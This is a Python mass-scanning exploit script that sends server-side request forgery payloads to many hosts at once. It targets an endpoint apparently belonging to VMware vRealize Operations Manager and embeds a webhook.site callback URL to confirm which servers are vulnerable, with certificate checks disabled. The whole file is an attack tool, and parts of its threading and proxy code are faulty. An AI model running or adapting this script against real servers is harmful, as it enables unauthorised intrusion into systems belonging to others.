import os
import sys
import json
import time
import pandas as pd
import concurrent.futures
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
#for Personal User Only
#Developed by D0rkerDevil and waba
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

session_proxied = requests.Session()
session_proxied.proxies = {
  "http": "127.0.0.1",
}
out = []
CONNECTIONS = 100
TIMEOUT = 2
collab_addy = "webhook.site/cd495358-092b-4c25-a987-cd5167a7064f"#"randomid.burpcollab.net"

detected_hosts = []
in_ips = open(sys.argv[1]).read().splitlines()
ips = [x for x in in_ips[1:]]

def drop_hits(host,timeout):
    for hosts in host:
        vul_url = "https://{}:443/casa/nodes/thumbprints".format(hosts)
        try:
           vul_headers = {"Content-Type": "application/json;charset=UTF-8", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.37"}
           vuln_json=[collab_addy+"/ui/"]
           response = session_proxied.post(vul_url, headers=vul_headers, json=vuln_json,verify=False)
           if 200 == response.status_code:
              print("Vulnerable host detected {}".format(vul_url))
              tmp_headers = dict(response.request.headers)
              for k,v in tmp_headers.items():
                  print(k)
              '''
              print("*"*50)
              if host not in detected_hosts:
                 detected_hosts.append(host)
              '''
        except Exception as ex:
           pass
    
with concurrent.futures.ThreadPoolExecutor(max_workers=CONNECTIONS) as executor:
    future_to_ip = (executor.submit(drop_hits, ips, TIMEOUT) for ip in in_ips)
    time1 = time.time()
    for future in concurrent.futures.as_completed(future_to_ip):
        try:
            data = future.result()
        except Exception as exc:
            data = str(type(exc))
        finally:
            detected_hosts.append(data)

            print(str(len(detected_hosts)),end="\r")

    time2 = time.time()

print(f'Took {time2-time1:.2f} s')
print(pd.Series(detected_hosts).value_counts())
